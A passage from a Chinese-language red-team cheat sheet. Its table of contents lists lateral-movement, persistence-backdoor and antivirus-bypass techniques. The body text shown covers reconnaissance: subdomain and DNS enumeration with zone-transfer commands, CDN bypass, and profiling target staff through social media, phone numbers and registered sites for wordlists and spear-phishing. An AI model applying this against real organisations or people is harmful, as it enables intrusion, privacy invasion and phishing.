href=\"#pth-winexe\">pth-winexe</a></li>\n<li><a href=\"#smbexec\">Smbexec</a></li>\n</ul>\n</li>\n<li><a href=\"#pass-the-ticket\">PASS-THE-TICKET</a>\n<ul>\n<li><a href=\"#%E5%90%8D%E8%AF%8D\">名词</a></li>\n<li><a href=\"#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AEmimikatz\">黄金票据 + Mimikatz</a></li>\n<li><a href=\"#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AEmimikatz\">白银票据 + Mimikatz</a></li>\n<li><a href=\"#ms14-068\">MS14-068</a></li>\n<li><a href=\"#mimikatzmsf\">Mimikatz+MSF</a></li>\n<li><a href=\"#goldenpacpy\">goldenPac.py</a></li>\n</ul>\n</li>\n<li><a href=\"#%E8%B4%A6%E6%88%B7%E5%A7%94%E6%B4%BE\">账户委派</a>\n<ul>\n<li><a href=\"#%E8%B4%A6%E6%88%B7%E9%9D%9E%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE\">账户非受限委派</a></li>\n<li><a href=\"#%E8%B4%A6%E6%88%B7%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE\">账户受限委派</a></li>\n</ul>\n</li>\n<li><a href=\"#%E8%B5%84%E6%BA%90%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE\">资源受限委派</a></li>\n<li><a href=\"#cve-2019-0708\">CVE-2019-0708</a></li>\n<li><a href=\"#ntlm%E4%B8%AD%E7%BB%A7\">NTLM 中继</a>\n<ul>\n<li><a href=\"#ntlmrelayx%E8%B5%84%E6%BA%90%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE\">Ntlmrelayx + 资源受限委派</a></li>\n<li><a href=\"#responder\">Responder</a>\n<ul>\n<li><a href=\"#smb%E5%8D%8F%E8%AE%AE%E6%88%AA%E8%8E%B7\">SMB 协议截获</a></li>\n<li><a href=\"#wpad%E4%BB%A3%E7%90%86%E6%AC%BA%E9%AA%97\">WPAD 代理欺骗</a></li>\n<li><a href=\"#web%E6%BC%8F%E6%B4%9E\">Web 漏洞</a></li>\n<li><a href=\"#%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB\">中继攻击</a></li>\n<li><a href=\"#ntlmv2hash%E7%A0%B4%E8%A7%A3\">NTLMv2Hash 破解</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#gpp-password\">GPP-Password</a></li>\n<li><a href=\"#winrm%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C\">WinRM 无文件执行</a></li>\n<li><a href=\"#%E6%B7%BB%E5%8A%A0%E5%9F%9F%E7%AE%A1%E5%91%BD%E4%BB%A4\">添加域管命令</a></li>\n<li><a href=\"#ssh%E5%AF%86%E9%92%A5%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95\">SSH 密钥免密登录</a></li>\n<li><a href=\"#%E8%8E%B7%E5%8F%96%E4%BF%9D%E5%AD%98%E7%9A%84rdp%E5%AF%86%E7%A0%81\">获取保存的 RDP 密码</a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96\">后门 &amp; 持久化</a>\n<ul>\n<li><a href=\"#%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7\">影子用户</a></li>\n<li><a href=\"#rid%E5%8A%AB%E6%8C%81\">RID 劫持</a></li>\n<li><a href=\"#guest%E6%BF%80%E6%B4%BB\">Guest 激活</a></li>\n<li><a href=\"#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81\">映像劫持</a>\n<ul>\n<li><a href=\"#sethc\">Sethc</a></li>\n<li><a href=\"#%E8%BD%BB%E6%9D%BE%E4%BD%BF%E7%94%A8\">轻松使用</a></li>\n<li><a href=\"#ifeo%E9%9D%99%E9%BB%98%E6%89%A7%E8%A1%8C\">IFEO 静默执行</a></li>\n</ul>\n</li>\n<li><a href=\"#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%90%AF%E5%8A%A8%E9%A1%B9\">注册表启动项</a>\n<ul>\n<li><a href=\"#msf\">MSF</a></li>\n<li><a href=\"#cmd\">CMD</a></li>\n</ul>\n</li>\n<li><a href=\"#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1\">计划任务</a>\n<ul>\n<li><a href=\"#%E5%8A%A0%E8%BD%BDpowershell\">加载 powershell</a></li>\n<li><a href=\"#%E6%89%A7%E8%A1%8Cexe\">执行 exe</a></li>\n</ul>\n</li>\n<li><a href=\"#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5\">进程注入</a>\n<ul>\n<li><a href=\"#appcertdlls\">AppCertDlls</a></li>\n<li><a href=\"#appinit_dlls\">AppInit_DLLs</a></li>\n<li><a href=\"#msf\">MSF</a></li>\n</ul>\n</li>\n<li><a href=\"#%E7%99%BB%E5%BD%95%E5%88%9D%E5%A7%8B%E5%8C%96\">登录初始化</a>\n<ul>\n<li><a href=\"#%E5%B1%8F%E5%B9%95%E4%BF%9D%E6%8A%A4%E7%A8%8B%E5%BA%8F\">屏幕保护程序</a></li>\n</ul>\n</li>\n<li><a href=\"#mof\">MOF</a></li>\n<li><a href=\"#winrm%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8\">WinRM 端口复用</a></li>\n<li><a href=\"#%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1\">创建服务</a></li>\n<li><a href=\"#bitadmin\">Bitadmin</a></li>\n<li><a href=\"#clr-injection\">CLR Injection</a></li>\n<li><a href=\"#com-object-hijacking\">COM OBJECT hijacking</a>\n<ul>\n<li><a href=\"#caccpropservicesclass-and-mmdeviceenumerato\">CAccPropServicesClass and MMDeviceEnumerato</a></li>\n<li><a href=\"#explorer\">Explorer</a></li>\n</ul>\n</li>\n<li><a href=\"#squibledoo\">Squibledoo</a></li>\n<li><a href=\"#dll%E5%8A%AB%E6%8C%81\">DLL 劫持</a>\n<ul>\n<li><a href=\"#%E5%8A%AB%E6%8C%811\">劫持 1</a></li>\n<li><a href=\"#%E5%8A%AB%E6%8C%812\">劫持 2</a></li>\n<li><a href=\"#msdtc%E6%9C%8D%E5%8A%A1%E5%8A%AB%E6%8C%81\">MSDTC 服务劫持</a></li>\n<li><a href=\"#rattler\">Rattler</a></li>\n</ul>\n</li>\n<li><a href=\"#dll%E4%BB%A3%E7%90%86%E5%8A%AB%E6%8C%81%E5%8F%B3%E9%94%AE\">DLL 代理劫持右键</a></li>\n<li><a href=\"#%E4%BD%BF%E7%94%A8amsi%E6%89%AB%E6%8F%8F%E6%8E%A5%E5%8F%A3%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90\">使用 AMSI 扫描接口维持权限</a></li>\n<li><a href=\"#dll%E5%8A%AB%E6%8C%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1\">DLL 劫持计划任务</a></li>\n<li><a href=\"#dll%E6%B3%A8%E5%85%A5\">DLL 注入</a>\n<ul>\n<li><a href=\"#powershell\">Powershell</a></li>\n<li><a href=\"#injectproc\">InjectProc</a></li>\n</ul>\n</li>\n<li><a href=\"#%E9%80%9A%E8%BF%87%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF%E5%8A%A0%E8%BD%BD%E9%A1%B9%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90\">通过控制面板加载项维持权限</a></li>\n<li><a href=\"#%E9%80%9A%E8%BF%87%E8%87%AA%E5%AE%9A%E4%B9%89net%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E8%BF%9B%E8%A1%8CDLL%E6%B3%A8%E5%85%A5\">通过自定义.net 垃圾回收机制进行 DLL 注入</a></li>\n<li><a href=\"#windows-fax-dll-injection\">Windows FAX DLL Injection</a></li>\n<li><a href=\"#dsrm%E6%B3%A8%E5%86%8C%E8%A1%A8acl%E5%90%8E%E9%97%A8\">DSRM + 注册表 ACL 后门</a></li>\n<li><a href=\"#dcshadowsid-history\">DCShadow&amp;SID History</a></li>\n<li><a href=\"#dcsync%E5%90%8E%E9%97%A8\">DCSync 后门</a></li>\n<li><a href=\"#netsh-helper-dll\">Netsh Helper DLL</a>\n<ul>\n<li><a href=\"#msfvenom%E7%94%9F%E6%88%90dll\">MSFvenom 生成 DLL</a></li>\n<li><a href=\"#msfweb_delivery\">MSF+web_delivery</a></li>\n<li><a href=\"#msfshellcode\">MSF&amp;Shellcode</a></li>\n</ul>\n</li>\n<li><a href=\"#mssql%E5%90%8E%E9%97%A8\">MSSQL 后门</a></li>\n<li><a href=\"#nssm\">NSSM</a></li>\n<li><a href=\"#%E6%B7%BB%E5%8A%A0%E7%AD%BE%E5%90%8D\">添加签名</a></li>\n<li><a href=\"#metsvc\">Metsvc</a></li>\n<li><a href=\"#persistence\">Persistence</a></li>\n<li><a href=\"#hookpasswordchangenotify\">HookPasswordChangeNotify</a></li>\n<li><a href=\"#nppspy%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81\">NPPSpy 记录密码</a></li>\n<li><a href=\"#password-filter-dll\">Password Filter DLL</a></li>\n<li><a href=\"#wmic%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85\">WMIC 事件订阅</a></li>\n<li><a href=\"#wmi-persistence\">WMI-Persistence</a></li>\n<li><a href=\"#invoke-tasksbackdoor\">Invoke-Tasksbackdoor</a></li>\n<li><a href=\"#invoke-adsbackdoor\">Invoke-ADSBackdoor</a></li>\n<li><a href=\"#ads%E9%9A%90%E8%97%8Fwebshell\">ADS 隐藏 webshell</a></li>\n<li><a href=\"#adsjavascript\">ADS&amp;JavaScript</a></li>\n<li><a href=\"#empire\">Empire</a>\n<ul>\n<li><a href=\"#lnk%E5%90%8E%E9%97%A8\">LNK 后门</a></li>\n<li><a href=\"#wmi\">WMI</a></li>\n</ul>\n</li>\n<li><a href=\"#%E6%B3%A8%E5%85%A5ssp%E8%A2%AB%E5%8A%A8%E6%94%B6%E9%9B%86%E5%AF%86%E7%A0%81\">注入 SSP 被动收集密码</a>\n<ul>\n<li><a href=\"#mimikatz\">Mimikatz</a></li>\n<li><a href=\"#empire\">Empire</a></li>\n<li><a href=\"#powersploit\">Powersploit</a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%9F%BA%E4%BA%8E%E5%9F%9F%E7%AD%96%E7%95%A5%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E5%90%8E%E9%97%A8\">基于域策略文件权限后门</a></li>\n<li><a href=\"#kerberoasting%E5%90%8E%E9%97%A8\">Kerberoasting 后门</a></li>\n<li><a href=\"#s4u2self%E5%90%8E%E9%97%A8\">S4U2Self 后门</a></li>\n<li><a href=\"#%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE%E5%90%8E%E9%97%A8\">受限委派后门</a></li>\n<li><a href=\"#skeleton-key%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99\">Skeleton Key 万能钥匙</a></li>\n<li><a href=\"#%E5%94%AF%E4%B8%80ip%E8%AE%BF%E9%97%AE\">唯一 IP 访问</a></li>\n<li><a href=\"#linux-cron%E5%90%8E%E9%97%A8\">Linux cron 后门</a></li>\n<li><a href=\"#strace%E8%AE%B0%E5%BD%95ssh%E5%AF%86%E7%A0%81\">Strace 记录 ssh 密码</a></li>\n<li><a href=\"#sshd%E5%90%8E%E9%97%A8\">SSHD 后门</a></li>\n<li><a href=\"#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5\">进程注入</a></li>\n<li><a href=\"#ssh-wrapper%E5%90%8E%E9%97%A8\">SSH wrapper 后门</a></li>\n<li><a href=\"#suid-shell\">SUID Shell</a></li>\n<li><a href=\"#ssh%E5%85%AC%E7%A7%81%E9%92%A5%E7%99%BB%E5%BD%95\">SSH 公私钥登录</a></li>\n<li><a href=\"#reptile\">Reptile</a></li>\n<li><a href=\"#kbeast_rootkit\">Kbeast_rootkit</a></li>\n<li><a href=\"#openssh%E5%90%8E%E9%97%A8\">OpenSSH 后门</a></li>\n<li><a href=\"#iptables%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8\">IPTables 端口复用</a></li>\n<li><a href=\"#%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86\">文件处理</a></li>\n<li><a href=\"#iis_bin_backdoor\">IIS_Bin_Backdoor</a></li>\n<li><a href=\"#iis_netdll_spy\">IIS_NETDLL_Spy</a></li>\n<li><a href=\"#iis_raid\">IIS_RAID</a></li>\n<li><a href=\"#java-web-backdoor\">JAVA Web Backdoor</a></li>\n<li><a href=\"#tomcat-jsp-hideshell\">Tomcat JSP HideShell</a></li>\n<li><a href=\"#apache-module%E5%90%8E%E9%97%A81\">Apache Module 后门 1</a></li>\n<li><a href=\"#apache-module%E5%90%8E%E9%97%A82\">Apache Module 后门 2</a></li>\n<li><a href=\"#apache-module%E5%90%8E%E9%97%A83\">Apache Module 后门 3</a></li>\n<li><a href=\"#nginx-lua%E5%90%8E%E9%97%A8\">Nginx Lua 后门</a></li>\n<li><a href=\"#pwnnginx\">PwnNginx</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#%E6%B8%97%E9%80%8F%E5%92%8C%E7%BA%A2%E9%98%9Ftips\">渗透和红队 tips</a>\n<ul>\n<li><a href=\"#%E7%88%B6%E8%BF%9B%E7%A8%8B%E7%A0%B4%E5%9D%8F\">父进程破坏</a></li>\n<li><a href=\"#lot%E9%AB%98%E9%A2%91%E7%8E%87%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81\">loT 高频率账户密码</a></li>\n<li><a href=\"#bypass-mod_security\">Bypass mod_security</a></li>\n<li><a href=\"#%E6%9F%A5%E6%89%BEgit%E5%92%8Csvn%E7%9A%84%E5%AD%97%E5%85%B8\">查找 git 和 svn 的字典</a></li>\n<li><a href=\"#top-25-%E9%87%8D%E5%AE%9A%E5%90%91dorks\">Top 25 重定向 dorks</a></li>\n<li><a href=\"#%E4%BD%BF%E7%94%A8grep%E5%BF%AB%E9%80%9F%E5%8E%BB%E9%99%A4%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE\">使用 grep 快速去除垃圾数据</a></li>\n<li><a href=\"#%E5%B7%B2%E6%B3%84%E9%9C%B2%E7%9A%84%E5%AF%86%E7%A0%81%E6%95%B4%E7%90%86%E5%87%BA%E7%9A%84%E5%AD%97%E5%85%B8\">已泄露的密码整理出的字典</a></li>\n<li><a href=\"#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5bypass\">命令注入 Bypass</a></li>\n<li><a href=\"#%E6%9F%A5%E8%AF%A2%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8heartbleed%E6%BC%8F%E6%B4%9E\">查询是否存在 heartbleed 漏洞</a></li>\n<li><a href=\"#%E8%BF%9C%E7%A8%8B%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6\">远程解压文件</a></li>\n<li><a href=\"#top25-ssrf-dorks\">Top25 ssrf dorks</a></li>\n<li><a href=\"#%E4%BD%BF%E7%94%A8securitytrails-api%E6%9F%A5%E8%AF%A2%E5%AD%90%E5%9F%9F%E5%90%8D\">使用 SecurityTrails API 查询子域名</a></li>\n<li><a href=\"#%E9%82%AE%E4%BB%B6%E5%9C%B0%E5%9D%80payload\">邮件地址 payload</a></li>\n<li><a href=\"#web-server%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%91%BD%E4%BB%A4\">Web server 日志分析命令</a></li>\n<li><a href=\"#bypass-amsi\">Bypass AMSI</a></li>\n<li><a href=\"#bypass-amsi-2\">Bypass AMSI 2</a></li>\n<li><a href=\"#cve-2020-5902\">CVE-2020-5902</a></li>\n<li><a href=\"#%E4%B8%80%E4%BA%9B%E5%8F%AF%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E6%89%A7%E8%A1%8C\">一些可尝试绕过白名单的执行</a></li>\n<li><a href=\"#%E7%BB%95%E8%BF%87lsa-protection\">绕过 lsa protection</a></li>\n<li><a href=\"#pezor%E5%85%8D%E6%9D%80\">Pezor 免杀</a></li>\n<li><a href=\"#%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E9%80%BB%E8%BE%91\">动态调用进程注入逻辑</a></li>\n<li><a href=\"#%E5%9C%A8windows-server-2016%E5%92%8C2019%E4%B8%AD%E7%BB%95%E8%BF%87windows-defender\">在 Windows Server 2016 和 2019 中绕过 Windows Defender</a></li>\n<li><a href=\"#%E5%86%85%E5%AD%98%E4%B8%AD%E8%A7%A3%E7%A0%81shellcode%E7%BB%95%E8%BF%87av\">内存中解码 shellcode 绕过 av</a></li>\n<li><a href=\"#cshot-shellcode%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8\">cshot shellcode 远程加载器</a></li>\n<li><a href=\"#thinkphp%E6%B8%97%E9%80%8F%E6%89%8B%E6%AE%B5\">thinkphp 渗透手段</a></li>\n<li><a href=\"#%E4%BD%BF%E7%94%A8windows-defender%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6\">使用 windows defender 下载文件</a></li>\n<li><a href=\"#powershell%E8%84%9A%E6%9C%AC%E6%B7%B7%E6%B7%86%E7%BB%95%E8%BF%87amsi%E5%92%8Cav\">Powershell 脚本混淆绕过 amsi 和 av</a></li>\n<li><a href=\"#%E9%80%9A%E8%BF%87%E6%8C%82%E8%B5%B7eventLog%E6%9C%8D%E5%8A%A1%E7%BA%BF%E7%A8%8B%E7%A6%81%E7%94%A8windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97\">通过挂起 EventLog 服务线程禁用 Windows 事件日志</a></li>\n<li><a href=\"#dedecms\">dedecms</a></li>\n<li><a href=\"#dedecms%E5%89%8D%E5%8F%B0%E9%87%8D%E7%BD%AE%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81\">dedecms 前台重置任意管理员密码</a></li>\n<li><a href=\"#shiro-rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\">Shiro rememberMe 反序列化漏洞</a></li>\n<li><a href=\"#shiro-padding-oracle-attack\">Shiro Padding Oracle Attack</a></li>\n<li><a href=\"#shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87\">shiro 权限绕过</a></li>\n<li><a href=\"#%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E\">编辑器漏洞</a></li>\n<li><a href=\"#%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEphpmyadmin\">宝塔面板未授权访问 phpmyadmin</a></li>\n<li><a href=\"#%E6%B7%B1%E4%BF%A1%E6%9C%8D\">深信服</a></li>\n<li><a href=\"#%E4%BB%8Elfi%E5%88%B0rce\">从 LFI 到 RCE</a></li>\n<li><a href=\"#%E9%9A%90%E8%97%8Fwindows%E6%9C%8D%E5%8A%A1\">隐藏 windows 服务</a></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h1>\n<h2 id=\"whois\"><a class=\"anchor\" href=\"#whois\">#</a> Whois</h2>\n<pre><code>站点注册人注册过的其他网站(对注册人、邮箱、电话的反查)，对查到的站点的深入\n</code></pre>\n<h2 id=\"网站ip\"><a class=\"anchor\" href=\"#网站ip\">#</a> 网站 IP</h2>\n<h3 id=\"是否存在cdn\"><a class=\"anchor\" href=\"#是否存在cdn\">#</a> 是否存在 CDN</h3>\n<pre><code>Ping、多地ping、国外ping\n</code></pre>\n<h3 id=\"bypass-cdn常规方式\"><a class=\"anchor\" href=\"#bypass-cdn常规方式\">#</a> Bypass cdn 常规方式</h3>\n<pre><code>子域名\nhttps://dnsdb.io/zh-cn/\nPing根域名\nNslookup\nCloudflare的真实IP寻找\n  http://crimeflare.org:82/cfs.html\n  https://github.com/gwen001/pentest-tools/blob/master/cloudflare-origin-ip.py\n查找老域名\n查找关联域名\n  www.baidu.com\n  www.baidu.cn\n  www.baidu.org\n  www.baidu.xyz等等\n信息泄露/配置文件\nPhpinfo\n网页源码\nSvn\nGithub\nShodan/fofa/zoomeye\nSSL证书记录\nhttps://censys.io/\n网站漏洞\n  Xss\n  Ssrf\n  命令执行\n  SQL注入(某种情况loadfile读取linux的ip配置文件，hosts文件等)\nDNS记录，证书记录\n设置xff/x-remote-ip/x-remote-addr为127.0.0.1/或ipv6地址\nRSS订阅/邮件头\nAPP反编译搜索/截取APP的请求信息\n修改hosts文件指向\n</code></pre>\n<h2 id=\"域名历史ip\"><a class=\"anchor\" href=\"#域名历史ip\">#</a> 域名历史 IP</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94LnRocmVhdGJvb2suY24v\">https://x.threatbook.cn/</span></p>\n<h2 id=\"网站架构服务器指纹cms识别容器\"><a class=\"anchor\" href=\"#网站架构服务器指纹cms识别容器\">#</a> 网站架构 / 服务器指纹 / CMS 识别 / 容器</h2>\n<pre><code>Whatweb\n网页源代码\n请求头/响应头\n网站底部，顶部，左上角右上角\n网站报错信息\nhttp://www.yunsee.cn/\n域名/install\nFirefox插件Wappalyzer\nCMS漏洞\n  定位版本对应已知漏洞检查\n  CMS未知漏洞挖掘\nWeb容器已知漏洞(解析漏洞这种)\n显示网站使用的技术\n  https://builtwith.com/\n中间件、组件\nWeblogic、tomcat、zabbix、struts、axis等\nhttps://github.com/FortyNorthSecurity/EyeWitness\n</code></pre>\n<h2 id=\"子域名\"><a class=\"anchor\" href=\"#子域名\">#</a> 子域名</h2>\n<pre><code>老站、同样架构或同源码的子站\n爆破，接口查询\n  https://phpinfo.me/domain/\n  https://d.chinacycc.com/index.php?m=Login&amp;a=index\n  subDomainBrute、knockpy\nOWA发现、dig adfs、dig mail\nhttps://dns.bufferover.run/dns?q=baidu.com\nhttp://api.hackertarget.com/reversedns/?q=target.com\n</code></pre>\n<h2 id=\"网站使用的cms的官方demo站\"><a class=\"anchor\" href=\"#网站使用的cms的官方demo站\">#</a> 网站使用的 CMS 的官方 demo 站</h2>\n<pre><code>找不到demo就找源码开发者，加群什么的，结合社会工程学要个后台截图(对于一些后台目录复杂的cms)，注意看网站上一些功能介绍的截图。\n</code></pre>\n<h2 id=\"ssl证书信息\"><a class=\"anchor\" href=\"#ssl证书信息\">#</a> SSL 证书信息</h2>\n<pre><code>https://crt.sh/?q=%25.target.com\nhttps://censys.io/certificates?q=target.com\nhttps://github.com/cheetz/sslScrape\n</code></pre>\n<h2 id=\"dns历史解析记录\"><a class=\"anchor\" href=\"#dns历史解析记录\">#</a> DNS 历史解析记录</h2>\n<pre><code>https://dnsdumpster.com/\nhttps://censys.io/\nhttps://securitytrails.com/\n域传送漏洞检查\n  Dnsenum、fierce\nhttp://ha.ckers.org/fierce/ \n$ ./fierce.pl -dns example.com \n$ ./fierce.pl –dns example.com –wordlist myWordList.txt\n&gt;dig @ns.example.com example=.com AXFR \n&gt;nslookup -type=ns xxx.yyy.cn #查询解析某域名的DNS服务器\n&gt;nslookup #进入nslookup交互模式\n&gt;server dns.domian.com #指定dns服务器\n&gt;ls xxx.yyy.cn #列出域信息\n</code></pre>\n<h2 id=\"同服站点情况\"><a class=\"anchor\" href=\"#同服站点情况\">#</a> 同服站点情况</h2>\n<pre><code>https://site.ip138.com/\n火狐插件flagfox,配置单击指向bing查ip对应的域名\n</code></pre>\n<h2 id=\"同样架构或源码的站\"><a class=\"anchor\" href=\"#同样架构或源码的站\">#</a> 同样架构或源码的站</h2>\n<h2 id=\"网站js\"><a class=\"anchor\" href=\"#网站js\">#</a> 网站 js</h2>\n<pre><code>https://github.com/003random/getJS\nhttps://github.com/Threezh1/JSFinder\n或浏览器F12也可以看到加载的\n敏感信息、可能存在漏洞的参数等信息\n查看网页源代码，注释的一些信息，比如没有删掉的接口、前台没有的页面、越权、注入、js等\n</code></pre>\n<h2 id=\"网站使用的第三方js\"><a class=\"anchor\" href=\"#网站使用的第三方js\">#</a> 网站使用的第三方 js</h2>\n<h2 id=\"云信息\"><a class=\"anchor\" href=\"#云信息\">#</a> 云信息</h2>\n<pre><code>Aliyun、AWS、GCP、Azure等\n查找可公开访问的实例\n  https://github.com/gwen001/s3-buckets-finder\n  https://github.com/nccgroup/aws-inventory\n  https://github.com/jordanpotti/AWSBucketDump\n</code></pre>\n<h2 id=\"app反编译\"><a class=\"anchor\" href=\"#app反编译\">#</a> APP 反编译</h2>\n<pre><code>url、js、osskey、api等信息查找\n搜集到接口该怎么做\n  Fuzz常见参数\n</code></pre>\n<h2 id=\"c段b段信息\"><a class=\"anchor\" href=\"#c段b段信息\">#</a> C 段 / B 段信息</h2>\n<pre><code>Banner、是否存在目标的后台或其他入口/其他业务系统\n</code></pre>\n<h2 id=\"工具\"><a class=\"anchor\" href=\"#工具\">#</a> 工具</h2>\n<pre><code>recon-ng,theharvester,maltego,exiftool等\nhttps://www.spiderfoot.net/\nhttps://github.com/smicallef/spiderfoot\n</code></pre>\n<h2 id=\"端口对外开放情况\"><a class=\"anchor\" href=\"#端口对外开放情况\">#</a> 端口对外开放情况</h2>\n<pre><code>Masscan、scanport等\n针对常见的那些端口的利用的常规方法\n常见的未授权访问的服务如redis，mongodb等\n</code></pre>\n<h2 id=\"目录扫描爬虫慎用\"><a class=\"anchor\" href=\"#目录扫描爬虫慎用\">#</a> 目录扫描 / 爬虫 (慎用)</h2>\n<h2 id=\"waf情况识别\"><a class=\"anchor\" href=\"#waf情况识别\">#</a> WAF 情况识别</h2>\n<pre><code>https://github.com/EnableSecurity/wafw00f\n做好绕过策略的计划\n</code></pre>\n<h2 id=\"随手测试\"><a class=\"anchor\" href=\"#随手测试\">#</a> 随手测试</h2>\n<pre><code>单引号\nxx.jpg/.php\nadmin/123456\n万能密码\nHeartbleed漏洞\n</code></pre>\n<h2 id=\"搜索引擎\"><a class=\"anchor\" href=\"#搜索引擎\">#</a> 搜索引擎</h2>\n<pre><code>Google自定义搜索引擎整合的300多个社交网站\n  https://cse.google.com/cse?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&amp;cx=001794496531944888666:iyxger-cwug&amp;q=%22%22\nGoogle自定义搜索引擎整合的文件共享网站\n  https://cse.google.com/cse/publicurl?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&amp;cx=001794496531944888666:hn5bcrszfhe&amp;q=%22%22\n领英用户提取\n  https://cse.google.com/cse?cx=001394533911082033616:tm5y1wqwmme\n</code></pre>\n<h2 id=\"shodanfofazoomeye\"><a class=\"anchor\" href=\"#shodanfofazoomeye\">#</a> Shodan/fofa/zoomeye</h2>\n<h2 id=\"google-dorks\"><a class=\"anchor\" href=\"#google-dorks\">#</a> Google dorks</h2>\n<pre><code> Site,filetype,intitle,inurl,intext等\n</code></pre>\n<h2 id=\"信息泄露\"><a class=\"anchor\" href=\"#信息泄露\">#</a> 信息泄露</h2>\n<pre><code>电话、邮箱，姓名\n目录遍历\n备份文件\n  (www.zip,xx.com.zip,www.xx.com.zip,wwwroot.zip)\n.svn/.git/sql/robots/crossdomin.xml/DS_Store等\n  https://github.com/lijiejie/ds_store_exp\n  https://github.com/admintony/svnExploit\n若是论坛ID=1的用户名一般为管理、或查看帖子信息、生成字典\n网页上客服的QQ(先判断是企业的还是个人，用处有时不太大，看怎么用，搞个鱼叉什么的)\n</code></pre>\n<h2 id=\"网页缓存\"><a class=\"anchor\" href=\"#网页缓存\">#</a> 网页缓存</h2>\n<pre><code>http://www.cachedpages.com/\n</code></pre>\n<h2 id=\"图片反查\"><a class=\"anchor\" href=\"#图片反查\">#</a> 图片反查</h2>\n<pre><code>百度识图、googleimage、tineye\n原图查询坐标\n</code></pre>\n<h2 id=\"社交\"><a class=\"anchor\" href=\"#社交\">#</a> 社交</h2>\n<pre><code>QQ、weibo、支付宝、脉脉、领英、咸鱼、短视频、人人、贴吧、论坛\n外网信息\n有些人喜欢把自己的生活传到外网\n  推特、ins、fb等\n</code></pre>\n<h2 id=\"手机号加入通讯录匹配各个app用户信息\"><a class=\"anchor\" href=\"#手机号加入通讯录匹配各个app用户信息\">#</a> 手机号加入通讯录匹配各个 APP 用户信息</h2>\n<h2 id=\"注册过的网站\"><a class=\"anchor\" href=\"#注册过的网站\">#</a> 注册过的网站</h2>\n<pre><code>https://www.reg007.com/\nhttps://www.usersearch.org/\n</code></pre>\n<h2 id=\"目标人员的兴趣\"><a class=\"anchor\" href=\"#目标人员的兴趣\">#</a> 目标人员的兴趣</h2>\n<pre><code>\t目标人员的兴趣 注册过的小众论坛，站点\n针对此类站点的深入\n收集到的用户名，电话等信息生成字典\n</code></pre>\n<h2 id=\"邮箱搜集\"><a class=\"anchor\" href=\"#邮箱搜集\">#</a> 邮箱搜集</h2>\n<pre><code>https://hunter.io/\nhttps://github.com/killswitch-GUI/SimplyEmail\n</code></pre>\n<h2 id=\"exchange\"><a class=\"anchor\" href=\"#exchange\">#</a> Exchange</h2>\n<pre><code>https://github.com/dafthack/MailSniper\n</code></pre>\n<h2 id=\"验证邮箱是否存在\"><a class=\"anchor\" href=\"#验证邮箱是否存在\">#</a> 验证邮箱是否存在</h2>\n<pre><code>https://tools.verifyemailaddress.io/\n</code></pre>\n<h2 id=\"历史泄露过的资料等\"><a class=\"anchor\" href=\"#历史泄露过的资料等\">#</a> 